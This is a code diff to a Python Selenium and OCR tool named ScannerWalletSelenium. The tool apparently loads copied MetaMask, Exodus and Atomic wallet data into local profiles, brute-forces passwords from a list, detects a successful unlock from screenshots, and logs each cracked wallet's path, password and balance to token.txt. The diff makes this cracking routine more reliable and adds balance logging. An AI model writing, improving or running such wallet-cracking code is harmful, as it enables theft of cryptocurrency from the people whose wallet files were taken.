@@ -95,8 +95,7 @@ class ScannerWalletSelenium:
             time.sleep(5)
             try:
                 namepassword = self.driver.find_element("name", "password")
-                print('namepassword', namepassword)
-                if self.driver.find_element("name", "password"):
+                if namepassword:
                     if self.wallet["password"]:
                         for password in str(self.wallet["password"]).split("|"):
                             print('dzo ', password)
@@ -136,12 +135,7 @@ class ScannerWalletSelenium:
                 else:
                     return False
             except:
-                print('dzo here')
-                try:
-                    if  self.driver.find_element("xpath", "/html/body/div[1]/div/div[2]/div/div/div/div/div/div/ul/li[1]"):
-                        return False
-                except:    
-                    return True
+                return False
         except:
             return False
     
@@ -213,8 +207,12 @@ class ScannerWalletSelenium:
 
         self.delete_files_and_subdirectories(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa")
         files = os.listdir(self.wallet["path"])
-        for fname in files:
-            shutil.copy2(os.path.join(self.wallet["path"], fname), rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa")
+        try:
+             for fname in files:
+                shutil.copy2(os.path.join(self.wallet["path"], fname), rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa")
+        except:
+            print('coppy error')
+            return
         time.sleep(1)
         options = webdriver.ChromeOptions()
         options.add_argument(rf"--user-data-dir=C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake") #e.g. C:\Users\You\AppData\Local\Google\Chrome\User Data
@@ -270,7 +268,6 @@ class ScannerWalletSelenium:
                     cv2.imwrite("image-temp/screen-login-check.png", check_login)
                     loginCheckScreen = pytesseract.image_to_string("image-temp/screen-login-check.png")
                     if 'Unlock to Continue' not in loginCheckScreen:
-                        time.sleep(30)
                         os.system('tskill Exodus')
                         self.passwordSuccess = password
                         return True
@@ -290,10 +287,14 @@ class ScannerWalletSelenium:
             if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Roaming\atomic"):
                 return False
             self.delete_files_and_subdirectories(rf"C:\Users\{os.getlogin()}\AppData\Roaming\atomic")
+            os.system('tskill "Atomic Wallet"')
         except:
             return False
-
-        self.copytree(self.wallet['path'], rf"C:\Users\{os.getlogin()}\AppData\Roaming\atomic")
+        try:
+            self.copytree(self.wallet['path'], rf"C:\Users\{os.getlogin()}\AppData\Roaming\atomic")
+        except:
+            print('coppy error')
+            return False
         time.sleep(2)
         os.startfile(rf'C:\Users\{os.getlogin()}\AppData\Local\Programs\atomic\Atomic Wallet.exe')
         time.sleep(10)
@@ -380,7 +381,6 @@ class ScannerWalletSelenium:
             checkLogin = self.initEdoxus()
             if checkLogin == True:
                 open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
-                time.sleep(30)
                 self.ref.checksuccess.emit(True, self.index, "Login thành công")
 
             if checkLogin == False:
@@ -390,10 +390,8 @@ class ScannerWalletSelenium:
         if self.wallet["wallet"] == "Atomic":
             checkLogin = self.initAtomic()
             print('checkLogin', checkLogin)
-            time.sleep(50)
             if checkLogin == True:
-                open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
-                time.sleep(30)
+                open("token.txt", 'a+').write("%s|%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess, self.balance))
                 self.ref.checksuccess.emit(True, self.index, "Login thành công")
 
             if checkLogin == False:
